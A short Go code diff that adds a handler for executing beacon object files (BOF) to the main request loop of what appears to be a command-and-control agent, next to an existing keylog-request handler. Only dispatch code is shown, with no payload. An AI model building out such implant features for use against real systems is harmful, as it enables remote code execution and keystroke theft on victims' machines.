@@ -104,6 +104,11 @@ func main() {
 			continue
 		}
 
+		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
+			continue
+		}
+
 		if err := handleKeysRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "keylogs", err)
 			continue
